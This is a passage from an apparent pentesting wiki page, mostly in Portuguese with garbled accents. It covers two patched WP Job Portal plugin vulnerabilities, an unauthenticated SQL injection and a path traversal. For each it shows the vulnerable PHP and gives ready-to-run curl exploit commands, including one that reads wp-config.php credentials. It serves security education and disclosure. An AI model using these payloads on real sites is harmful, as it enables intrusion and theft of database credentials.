- Renomeie o arquivo **`wp-admin.php`** e permita acesso apenas internamente ou de certos endere√ßos IP.


### Inje√ß√£o SQL n√£o autenticada via valida√ß√£o insuficiente (WP Job Portal <= 2.3.2)

O plugin de recrutamento WP Job Portal exp√¥s uma tarefa **savecategory** que acaba por executar o seguinte c√≥digo vulner√°vel dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **Unsanitised user input** ‚Äì `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** ‚Äì no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### Explora√ß√£o

1. Pegue um nonce novo:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Injete SQL arbitr√°rio abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
A resposta revela o resultado da query injetada ou altera o banco de dados, comprovando a SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Outra tarefa, **downloadcustomfile**, permitia que visitantes baixassem **qualquer arquivo no disco** via path traversal.  O sink vulner√°vel est√° localizado em `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` √© controlado pelo atacante e concatenado **sem sanitiza√ß√£o**.  Novamente, a √∫nica barreira √© um **CSRF nonce** que pode ser obtido na p√°gina de curr√≠culo.

#### Explora√ß√£o
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
O servidor responde com o conte√∫do de `wp-config.php`, leaking DB credentials and auth keys.

## Refer√™ncias

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)

{{#include ../../banners/hacktricks-training.md}}
